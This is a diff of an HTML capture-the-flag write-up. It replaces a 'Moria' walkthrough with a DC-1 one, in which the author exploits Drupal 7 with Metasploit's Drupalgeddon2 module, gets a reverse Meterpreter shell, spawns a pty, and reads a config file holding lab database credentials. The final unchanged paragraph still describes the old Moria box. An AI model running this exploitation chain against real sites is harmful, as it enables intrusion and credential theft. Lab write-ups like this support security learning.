@@ -80,64 +80,148 @@
 			Drupal 7 on line 17: </p>
 			<br>
 <pre><code class="language-none">
-			<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
-</code></pre>
-			<br>
-			<p>The text seems to be hinting that we should be listening instead of knocking. At this point I fired up WireShark and saw the below TCP connections back to my machine. </p>
-			<br>
-			<img class="img-responsive" src="/images/Moria/wireshark.png" alt="Wireshark Capture">
-			<br>
-			<br>
-			<p> At first I thought it may be trying to send a message back to me. I started NetCat listening on all of the ports (77,101,108,111, and 110). NetCat could catch the TCP connection and send back a [SYN, ACK] to the VM but the connection was quickly reset by the VM. I wasn't quite sure what to do with the connections so I started looking at FTP server. When I connected I was sent back the following banner. Looks like Balrog could be a username. </p>
-			<br>
-<pre><code class="language-none">
-root@kali:~Desktop# ftp 192.168.56.104
-Connected to 192.168.56.104.
-220 Welcome Balrog!
-Name (192.168.56.104:root):
+			&lt;meta name=&quot;Generator&quot; content=&quot;Drupal 7 (http://drupal.org)&quot; /&gt;
 </code></pre>
 			<br>
 			<h3>Gaining Access</h3>
 			<br>
-			<p>I tried bruteforcing the FTP password using Metasploit but I quickly was locked out after a few failed attempts. I check for any relevant exploits but also came up empty.
-			Then it dawned on me, I was given the FTP username so perhaps I was also given the password? I went back to the Wireshark capture and took a closer look. The TCP connections the VM was sending me all had different port numbers except for 108, which was used twice. Was this a password? I tried the port numbers as the password for Balrog without success. Then I looked up the port numbers in an ascii table and realized they spell out the word Mellon in ascii code. Boom! We are in. </p>
-			<br>
-			<p>My first objective was to upload a reverse shell somewhere in the web servers directory. Unfortunately, that was not possible and modifying most any other part of the VM was impossible as the Balrog user didn't seem to have much permission to write files anywhere. I did however, find this directory which wasn't reviled during the <code>DIRB</code> scan:</p>
+			<p><code>DIRB</code> didn't find anything useful. This seems like a typical default Drupal install. I diecided to fire up Metasploit to see if the site is vulnerable to any of the Drupal 7 RCE exploits. </p>
 			<br>
 <pre><code class="language-none">
-ftp> ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
-drwxr-xr-x    2 0        0              23 Mar 12 20:38 QlVraKW4fbIkXau9zkAPNGzviT3UKntl
--r--------    1 48       48             85 Mar 12 19:55 index.php
--r--------    1 48       48         161595 Mar 11 23:12 moria.jpg
-drwxr-xr-x    3 0        0              15 Mar 12 04:50 w
-226 Directory send OK.
-ftp>
+	wake up, Neo...
+the matrix has you
+follow the white rabbit.
+
+	knock, knock, Neo.
+
+								(`.         ,-,
+								` `.    ,;' /
+								 `.  ,'/ .'
+									`. X /.'
+				.-;--''--.._` ` (
+			.'            /   `
+		 ,           ` '   Q '
+		 ,         ,   `._    \
+	,.|         '     `-.;_'
+	:  . `  ;    `  ` --,.._;
+	 ' `    ,   )   .'
+			`._ ,  '   /_
+				 ; ,''-,;' ``-
+					``-..__``--`
+
+										 https://metasploit.com
+
+
+=[ metasploit v5.0.2-dev                           ]
++ -- --=[ 1852 exploits - 1046 auxiliary - 325 post       ]
++ -- --=[ 541 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
++ -- --=[ ** This is Metasploit 5 development branch **   ]
+
+msf5 > search drupal
+
+Matching Modules
+================
+
+Name                                           Disclosure Date  Rank       Check  Description
+----                                           ---------------  ----       -----  -----------
+auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
+auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
+exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
+exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
+exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
+exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
+exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
+
+
+msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > SET RHOST 192.168.18.129
+[-] Unknown command: SET.
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > options
+
+Module options (exploit/unix/webapp/drupal_drupalgeddon2):
+
+Name         Current Setting  Required  Description
+----         ---------------  --------  -----------
+DUMP_OUTPUT  false            no        If output should be dumped
+PHP_FUNC     passthru         yes       PHP function to execute
+Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+RHOSTS                        yes       The target address range or CIDR identifier
+RPORT        80               yes       The target port (TCP)
+SSL          false            no        Negotiate SSL/TLS for outgoing connections
+TARGETURI    /                yes       Path to Drupal install
+VHOST                         no        HTTP server virtual host
+
+
+Exploit target:
+
+Id  Name
+--  ----
+0   Automatic (PHP In-Memory)
+
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.18.129
+RHOSTS => 192.168.18.129
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > run
+
+[*] Started reverse TCP handler on 192.168.18.128:4444
+[*] Drupal 7 targeted at http://192.168.18.129/
+[-] Could not determine Drupal patch level
+[*] Sending stage (38247 bytes) to 192.168.18.129
+[*] Meterpreter session 1 opened (192.168.18.128:4444 -> 192.168.18.129:52916) at 2019-03-25 20:38:02 -0400
+shell
+ls
+
+meterpreter > shell
+Process 3685 created.
+Channel 0 created.
+whoami
+www-data
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@DC-1:/var$ cd www
+cd www
+www-data@DC-1:/var/www$ ls
+ls
+COPYRIGHT.txt	    LICENSE.txt      cron.php	  misc	      sites
+INSTALL.mysql.txt   MAINTAINERS.txt  flag1.txt	  modules     themes
+INSTALL.pgsql.txt   README.txt	     includes	  profiles    update.php
+INSTALL.sqlite.txt  UPGRADE.txt      index.php	  robots.txt  web.config
+INSTALL.txt	    authorize.php    install.php  scripts     xmlrpc.php
+www-data@DC-1:/var/www$
+</code></pre>
+			<br>
+			<p>And we're in! I upgrade the shell using python and it looks like the first flag is in the web root: </p>
+			<br>
+<pre><code class="language-none">
+	www-data@DC-1:/var/www$ cat flag1.txt
+	cat flag1.txt
+	Every good CMS needs a config file - and so do you.
 </code></pre>
     		<br>
-    		<p>The directory revield a table with some usernames and what appear to be hashed passwords. In the comments of the page there was some salts and a hint as to which kind of hashing algorthm was used:</p>
+    		<p>Seems like we should take a look at the Drupal site config... and that's where the second flag can be found. There are also the DrupalDB user credentials:</p>
     		<br>
-    			<img class="img-responsive" src="/images/Moria/hashes.png" alt="hashes" width="525">
-    		<br>
-    		<br>
-   			<p>With 9 passwords to crack I decided to fire up a AWS P2 spot instance. The instance I rented had a Nvidia Tesla K80 GPU. I installed the required Nvidia drivers and uploaded hashcat and the rockyou.txt wordlist. In all of 10 seconds hashcat had found all 9 passwords:</p>
-   			<br>
-   				<img class="img-responsive" src="/images/Moria/hashcat.png" alt="hashcat" width="500">
-   			<br>
-   			<br>
-   				<p>None of the users had FTP access. However, I was able to SSH using the Ori account. In Ori's home directory was the below poem: </p>
-   			<br>
    			<pre><code class="language-none">
--bash-4.2$ cat poem.txt
-Ho! Ho! Ho! to the bottle I go
-To heal my heart and drown my woe.
-Rain may fall and wind may blow,
-And many miles be still to go,
-But under a tall tree I will lie,
-And let the clouds go sailing by.
+					/**
+					 *
+					 * flag2
+					 * Brute force and dictionary attacks aren't the
+					 * only ways to gain access (and you WILL need access).
+					 * What can you do with these credentials?
+					 *
+					 */
 
-PS: Moria will not fall!
+					$databases = array (
+					  'default' =>
+					  array (
+					    'default' =>
+					    array (
+					      'database' => 'drupaldb',
+					      'username' => 'dbuser',
+					      'password' => 'R0ck3t',
+					      'host' => 'localhost',
+					      'port' => '',
+					      'driver' => 'mysql',
+					      'prefix' => '',
 </code></pre>
 			<br>
 			<p>Unfortunately, the poem didn't seem to offer any hints. This is where I spent the majority of my time with this CTF. Baesed on how this CTF had gone so far I was pretty sure it wouldn't involve any carzy exploits. g0tmi1k's guide to linux privilege escalation came in handy. I went through most of the guide until I reached his section on private keys. Earlier I had noticed there was a SSH key located in ~/.ssh/ and under closer inspection the loopback address of 127.0.0.1 was in the known_hosts list. Interesting. The id_rsa key didn't appear to be for Ori... after a few attempts I realized I could SSH as root without using a password! Here's the flag: </p>
